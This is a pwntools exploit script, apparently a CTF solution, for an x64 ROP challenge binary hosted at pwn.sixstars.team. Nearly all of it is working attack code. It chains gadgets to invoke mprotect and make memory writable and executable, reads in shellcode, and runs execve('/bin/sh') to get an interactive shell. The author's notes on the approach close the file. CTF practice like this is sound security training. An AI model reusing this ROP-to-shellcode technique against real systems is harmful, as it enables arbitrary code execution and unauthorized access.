#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./level4.1-rop_x64"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team",23004)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.add)
    pause()

pop_rdi= 0x00000000004001b9 # pop rdi ; mov rbx, qword ptr [rdx] ; ret
pop_rdx= 0x00000000004001a5 # pop rdx ; add rcx, qword ptr [rsi] ; ret
pop_rsi= 0x00000000004001c2 # pop rsi ; add rcx, qword ptr [rcx] ; ret
write = 0x40013D   #  mov     eax, 1; syscall
read =  0x400130
syscall = 0x40019b
bug_func= 0x400157
mprotect_num = 0x0a

#pop rsi; pop rdx;  pop rdi;  pop rdx;  write
# write to control rax; to make a syscall to mprotect

rop0 = ['a'*0x10, p64(syscall),p64(pop_rsi) ,p64(0x400068),p64(syscall),p64(pop_rdx),p64(0x400800),p64(pop_rdi) ,p64(1),p64(pop_rdx), p64(mprotect_num), p64(write),
       p64(pop_rdx),p64(0x400800),p64(pop_rdi),p64(0x400000),p64(pop_rdx),p64(7),p64(pop_rsi),p64(0x1000),p64(syscall),p64(bug_func)]

payload0 = ''.join(rop0)

rop1 = ['a'*0x10, p64(syscall), p64(pop_rsi), p64(0x400500),p64(pop_rdx),p64(0x400000),p64(pop_rdi),p64(0x0),p64(pop_rdx),p64(0x80),p64(read),p64(0x400500)]
payload1 = ''.join(rop1)

shellcode="""
   call here
   .ascii "/bin/sh"
   .byte 0
here:
   pop rdi
   xor rsi,rsi
   xor rdx, rdx
   mov rax,0x3b
   syscall
"""

sh = asm(shellcode,arch="amd64")
r.recvuntil("ROP like a 64-bit PRO:")
r.send(payload0+'a'*(0x100-len(payload0)))
r.recvuntil("Good Luck!\n")
debug()
r.send(payload1+'a'*(0x100-len(payload1)))
r.sendline(sh)
r.interactive()

'''
# bad syscall
# 
rcx: mov ecx,0x50fd3e1 mmap:指定内存 # mmap 足够大内存，使rsi不用转化
pop rsi; pop rdx;  pop rdi;  pop rdx;  write

pop rdx; pop rdi; pop rdx; syscall bug_func
# 对付rsi 可以mmap足够大内存处写内存，这样第二次就不用管rsi
mprotect 第三个值可以取0a？

'''
